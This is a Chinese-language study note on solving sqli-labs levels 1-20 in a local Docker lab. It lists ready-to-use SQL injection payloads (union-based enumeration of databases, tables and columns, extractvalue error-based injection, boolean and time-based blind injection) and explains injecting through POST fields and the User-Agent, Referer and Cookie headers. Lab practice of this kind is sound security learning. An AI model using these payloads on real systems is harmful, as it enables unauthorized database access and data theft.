## sqlilab做题总结（一）

开始重新系统学习sql注入，本地docker搭建了一个sqlilab的靶场，今天先搞1-20.

##### Less1-4

Less1-4是最简单的四种情况，采用最基本的联合查询注入即可完成。注意不同的引号/括号闭合方式。主要有Less1:单引号闭合型，Less2:无任何引号or括号(数字型)，Less3:单引号加括号，Less4:双引号加括号。

主要注入payload(以Less1为例)：

```sql
?id=-1' union select 1,2,3 %23 # 判断显示位，本题为3列，其中第二列为Login name,第三列为password
```

```sql
?id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23 # 数据库名
```

```sql
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security"),3 %23 # 数据表名
```

```sql
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="XXXXX"),3 %23 # 列名
```

##### Less5-10

这六个题主要考察报错注入和盲注(当然也可以全部盲注)，同样注意引号/括号闭合方式的不同。

Less5-6可以采用extractvalue,updatexml进行报错注入：(以Less5为例)

```sql
?id=1' and (extractvalue('asdfasdf', concat('~', (select database())))) %23 # 数据库名
```

````sql
?id=1' and (extractvalue('asdfasdf', concat('~', (select group_concat(table_name) from information_schema.tables where table_schema="security")))) %23 # 数据表名
````

```sql
?id=1' and (extractvalue('asdfasdf', concat('~', (select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="XXXXX")))) %23 # 列名
```

Less7-8可以采用布尔盲注，写脚本完成。主要借助ascii()函数，substr()等字符串处理函数，if，case when等条件语句，通过对某个目标项的某一位是否等于某个值来进行判断。

以less7为例(注意闭合方式为```'))```,通过修改start和value的值，一位一位判断database()返回的字符串的每一位的字符是什么，从而达到获取结果的目的。

```sql
?id=1'))and if(ascii(substr(database(),{start},1))={value},1,0) %23 # 数据库名
```

```sql
?id=1'))and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema="security",{start},1))={value},1,0) %23 # 表名
```

```sql
?id=1'))and if(ascii(substr(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="XXXXX",{start},1))={value},1,0) %23   # 列名
```

Less9-10采用时间盲注，思路与7，8相似，不过这次改成了通过判断网页响应时间长短来确定我们盲注的结果是否正确。具体方法即如果判断正确则延迟5秒返回，如果判断错误则立即返回。

以Less9为例：

```sql
?id=1' and if(ascii(substr(database(),{start},1))={value},sleep(5),0) %23 # 数据库名
```

```sql
?id=1' and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema="security",{start},1))={value},sleep(5),0) %23 # 表名
```

```sql
?id=1' and if(ascii(substr(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="XXXXX",{start},1))={value},sleep(5),0) %23   # 列名
```

##### Less11-14

Less11-14均可采用联合查询注入的形式(username框)，只不过变成了post，注意闭合方式和列数，具体不再赘述。

##### Less15-16

同Less7-8,采用布尔盲注完成(username框)。

##### Less17-20

Less17:username框经过测试发现存在转义，无法注入，但password框可以，虽然是update语句，同理直接闭合引号随后报错注入即可。

Less18:本题username框和password框全部存在转义，根据题目提示User-Agent请求头可以进行注入，故尝试User-Agent处闭合单引号随后报错注入。

Less19:本题提示Referer，故尝试Referer处报错注入即可。

Less20:本题提示Cookie，观察Cookie形式后尝试Cookie处报错注入即可。